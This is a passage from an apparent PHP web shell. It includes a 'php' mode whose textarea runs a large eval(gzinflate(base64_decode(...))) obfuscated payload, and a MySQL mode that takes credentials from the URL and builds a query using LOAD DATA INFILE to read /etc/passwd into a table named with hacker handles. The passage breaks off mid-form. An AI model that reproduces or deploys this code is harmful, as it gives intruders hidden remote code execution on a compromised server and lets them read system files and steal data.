            </center>
		</div>
     		<!-- menu end -->
            
            
		<?php 
		if(isset($_GET['x']) && ($_GET['x'] == 'out')) { logout(); }
		elseif(isset($_GET['x']) && ($_GET['x'] == 'php'))
			{ 
			?> 
<form action="?y=<?php echo $pwd; ?>&amp;x=php" method="post"> 
<table class="cmdbox"> 

<tr>
<td>
<textarea class="output" name="cmd" id="cmd"><? eval(gzinflate(base64_decode('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'))); ?></textarea> 
</td>
</tr>
<tr>
<td>
						<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitcmd" />
              				</td>
				</tr>
			</table>
			</form>
			<?php 
         		} 
		elseif(isset($_GET['x']) && ($_GET['x'] == 'mysql'))
         		{ 
         			if(isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport']))
              				{ 
              				$sqlhost = $_GET['sqlhost']; $sqluser = $_GET['sqluser']; $sqlpass = $_GET['sqlpass']; $sqlport = $_GET['sqlport'];    
              				if($con = @mysql_connect($sqlhost.":".$sqlport,$sqluser,$sqlpass))
                   				{ 
                   				$msg .= "<div style=\"width:99%;padding:4px 10px 0 10px;\">"; 
                   				$msg .= "<p>Connected to ".$sqluser."<span class=\"gaya\">@</span>".$sqlhost.":".$sqlport; 
                   				$msg .= "&nbsp;&nbsp;<span class=\"gaya\">-&gt;</span>&nbsp;&nbsp;<a href=\"?y=".$pwd."&amp;x=mysql&amp;
                   				sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;
                   				sqlpass=".$sqlpass."&amp;
                   				sqlport=".$sqlport."&amp;\">[ databases ]</a>"; 
              					if(isset($_GET['db'])) 
                   					$msg .= "&nbsp;&nbsp;<span class=\"gaya\">-&gt;</span>&nbsp;&nbsp;
                   					<a href=\"y=".$pwd."&amp;x=mysql&amp;
                   					sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;
                   					sqlpass=".$sqlpass."&amp;
                   					sqlport=".$sqlport."&amp;
                   					db=".$_GET['db']."\">".htmlspecialchars($_GET['db'])."</a>"; 
              					if(isset($_GET['table'])) 
                   					$msg .= "&nbsp;&nbsp;<span class=\"gaya\">-&gt;
                   					</span>&nbsp;&nbsp;
                   					<a href=\"y=".$pwd."&amp;x=mysql&amp;
                   					sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;
                   					sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;
                   					db=".$_GET['db']."&amp;
                   					table=".$_GET['table']."\">".htmlspecialchars($_GET['table'])."</a>"; 
                   					$msg .= "</p><p>version : ".mysql_get_server_info($con)." proto ".mysql_get_proto_info($con)."</p>"; 
                   					$msg .= "</div>"; 
                   					echo $msg; 
              					if(isset($_GET['db']) && (!isset($_GET['table'])) && (!isset($_GET['sqlquery'])))
							{ 
							$db = $_GET['db']; 
                   					$query = "DROP TABLE IF EXISTS Newbie3viLc063s0_table;
                   					\nCREATE TABLE `Newbie3viLc063s0_table` ( `file` LONGBLOB NOT NULL );
                   					\nLOAD DATA INFILE \"/etc/passwd\"\nINTO TABLE Z3r0Z3r0_table;SELECT * FROM Newbie3viLc063s0_table;
                   					\nDROP TABLE IF EXISTS Newbie3viLc063s0_table;"; 
                   					$msg = "<div style=\"width:99%;padding:0 10px;\">
									<form action=\"?\" method=\"get\"> 
										<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
										<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
										<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
										<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
										<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
										<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
										<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
